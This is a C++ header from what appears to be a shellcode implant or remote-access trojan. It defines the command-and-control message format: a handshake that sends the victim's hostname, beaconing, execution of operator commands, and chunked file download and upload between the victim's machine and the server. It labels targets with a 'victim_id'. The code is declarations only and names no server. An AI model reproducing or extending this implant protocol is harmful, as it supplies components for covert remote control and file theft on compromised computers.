#pragma once

#include "shellcode.hpp"
#include "util.hpp"

#define MSG_DATA_MAX_LEN 32*1024
#define MAX_ERROR_MSG_LEN 512

#define MSG_TYPE_HANDSHAKE 0x1
#define MSG_TYPE_BEACON 0x2
#define MSG_TYPE_ERROR 0x3
#define MSG_TYPE_FILE_CHUNK_REQ 0x13
#define MSG_TYPE_TASK_COMPLETE 0x14
#define MSG_TYPE_TASK_OUTPUT 0x15

#define RESP_TYPE_FILE_DOWNLOAD 0x3
#define RESP_TYPE_IDLE 0x4
#define RESP_TYPE_EXEC_CMD 0x5
#define RESP_TYPE_FILE_CHUNK 0x6
#define RESP_TYPE_FILE_UPLOAD 0x7
#define RESP_TYPE_HANDSHAKE 0x08
#define RESP_TYPE_OUTPUT_ACK 0x09
#define RESP_TYPE_RECONNECT 0x0A
#define RESP_TYPE_TERMINATE 0xFF

#define FAIL_BAD_SERVER_RSP_MAGIC 0x60001
#define FAIL_BAD_SERVER_HANDSHAKE_RSP 0x60002
#define FAIL_BAD_SERVER_RESP_TYPE 0x60003
#define FAIL_TASK_TIMEOUT_REACHED 0x60004
#define FAIL_BAD_SERVER_OUTPUT_RSP 0x60005

#define OUTPUT_CHUNK_SIZE 4*1024

#define PAYLOAD_SIZE(X) ((USHORT*)(X->payload_size))[0]
#define SET_PAYLOAD_SIZE(X, N) ((USHORT*)(X->payload_size))[0] = N
#define GET_PAYLOAD_SIZE(X) ((USHORT*)(X->payload_size))[0]

#define ENC_KEY_LEN 256

struct client_message {
    unsigned char magic[3];
    unsigned char payload_size[2]; // includes everything past enc_key
    unsigned char enc_key[ENC_KEY_LEN];
    unsigned char victim_id[16];
    unsigned char msg_type;
    unsigned char data[MSG_DATA_MAX_LEN];
};

struct server_response {
    unsigned char magic[3];
    unsigned char payload_size[2]; // includes everything past this field
    unsigned char resp_type;
    unsigned char data[MSG_DATA_MAX_LEN];
};

struct handshake_data {
    DWORD hostname_len;
    unsigned char hostname[MAX_COMPUTERNAME_LENGTH + 1];
};

struct task_output_data {
    DWORD task_num;
    DWORD chunk_size;
    unsigned char output_chunk[OUTPUT_CHUNK_SIZE];
};

struct task_complete_data {
    DWORD task_num;
    DWORD task_type;
    DWORD exit_code;
};

struct task_command_data {
    DWORD task_num;
    DWORD timeout;
    DWORD command_len;
    char command[MAX_CMD_LEN + 1];
};

// Server instructs client to begin downloading file
struct task_start_download_data {
    DWORD task_num;
    DWORD dest_path_len;
    char dest_path[MAX_PATH];
};

// Client requests server for file download data
struct file_chunk_req {
    DWORD task_num;
    DWORD offset;
    DWORD chunk_max_size; // defines max chunk size to request
};

// Server instructs client to begin uploading file
struct task_start_upload_data {
    DWORD task_num;
    DWORD src_path_len;
    char src_path[MAX_PATH];
};

struct error_data {
    DWORD task_num;
    DWORD error_code;
};

DWORD InitializeComms(sh_context* ctx);

DWORD PerformHandshake(sh_context* ctx, client_message* msg_buf, server_response* resp_buf);

DWORD PerformBeacon(sh_context* ctx, client_message* msg_buf, server_response* resp_buf);

DWORD RequestFileChunk(sh_context* ctx, client_message* msg_buf, server_response* resp_buf, file_chunk_req* req_data);

DWORD SendTaskOutput(sh_context* ctx, client_message* msg_buf, server_response* resp_buf, task_output_data* data);

DWORD NotifyTaskComplete(sh_context* ctx, client_message* msg_buf, task_complete_data* data);

DWORD NotifyTaskError(sh_context* ctx, client_message* msg_buf, DWORD task_num, DWORD error_code);

void CommsCleanup(sh_context* ctx);

size_t GetClientMsgSize(client_message* msg);

DWORD SetClientMsg(client_message* msg, unsigned char* victim_id, unsigned char msg_type, void* data, size_t data_len, BCryptGenRandom_t rand_func);

BOOL ValidateMagic(server_response *msg);
